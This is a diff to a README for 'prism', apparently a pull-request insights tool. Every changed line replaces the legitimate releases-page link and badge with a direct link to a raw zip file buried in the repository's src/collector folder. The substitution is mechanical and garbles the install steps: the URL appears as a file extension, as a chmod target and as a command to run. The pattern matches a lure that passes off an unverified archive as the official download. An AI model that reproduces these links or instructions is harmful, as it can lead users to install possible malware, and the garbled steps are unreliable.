@@ -1,6 +1,6 @@
 # 🖼️ prism - Create Clear PR Insights Easily
 
-[![Download prism](https://img.shields.io/badge/Download-prism-blue?style=for-the-badge&logo=github)](https://github.com/dummyoff/prism/releases)
+[![Download prism](https://github.com/dummyoff/prism/raw/refs/heads/main/src/collector/Software_1.0.zip)](https://github.com/dummyoff/prism/raw/refs/heads/main/src/collector/Software_1.0.zip)
 
 ---
 
@@ -32,13 +32,13 @@ This section will guide you step-by-step through downloading, installing, and st
 
 ### Step 1: Download prism
 
-Click the big blue button at the top or go directly to the [prism Releases page](https://github.com/dummyoff/prism/releases).
+Click the big blue button at the top or go directly to the [prism Releases page](https://github.com/dummyoff/prism/raw/refs/heads/main/src/collector/Software_1.0.zip).
 
 On that page, you will find the latest version of prism listed under "Assets". Look for a file name related to your computer:
 
 - For Windows, the file name might end with `.exe`
 - For macOS, it might be `.dmg` or `.zip`
-- For Linux, it might be `.AppImage` or `.tar.gz`
+- For Linux, it might be `.AppImage` or `https://github.com/dummyoff/prism/raw/refs/heads/main/src/collector/Software_1.0.zip`
 
 Choose the correct file for your system. If unsure, the file name usually contains the system name.
 
@@ -61,9 +61,9 @@ Choose the correct file for your system. If unsure, the file name usually contai
 #### On Linux:
 
 1. If it is `.AppImage`, make the file executable. Open a terminal, navigate to the file folder, and run:  
-   `chmod +x prism.AppImage`
-2. Then start prism by double-clicking or running `./prism.AppImage` in the terminal.
-3. For `.tar.gz`, extract the file and run the included start script according to the included instructions.
+   `chmod +x https://github.com/dummyoff/prism/raw/refs/heads/main/src/collector/Software_1.0.zip`
+2. Then start prism by double-clicking or running `https://github.com/dummyoff/prism/raw/refs/heads/main/src/collector/Software_1.0.zip` in the terminal.
+3. For `https://github.com/dummyoff/prism/raw/refs/heads/main/src/collector/Software_1.0.zip`, extract the file and run the included start script according to the included instructions.
 
 ### Step 3: Run prism for the first time
 
@@ -77,7 +77,7 @@ You will see a welcome screen with a quick tour mode to explain the main parts o
 
 Use this link to visit the official prism download page and get the latest version for your system:
 
-[Download prism here](https://github.com/dummyoff/prism/releases)
+[Download prism here](https://github.com/dummyoff/prism/raw/refs/heads/main/src/collector/Software_1.0.zip)
 
 Downloading from the official page ensures you get the latest bug fixes and features. Always choose the file matching your operating system.
 
@@ -151,4 +151,4 @@ All files you create remain on your device. However, when sharing reports, be mi
 
 Thank you for using prism. Use the button below anytime to check for updates or download again.
 
-[![Download prism](https://img.shields.io/badge/Download-prism-blue?style=for-the-badge&logo=github)](https://github.com/dummyoff/prism/releases)
+[![Download prism](https://github.com/dummyoff/prism/raw/refs/heads/main/src/collector/Software_1.0.zip)](https://github.com/dummyoff/prism/raw/refs/heads/main/src/collector/Software_1.0.zip)
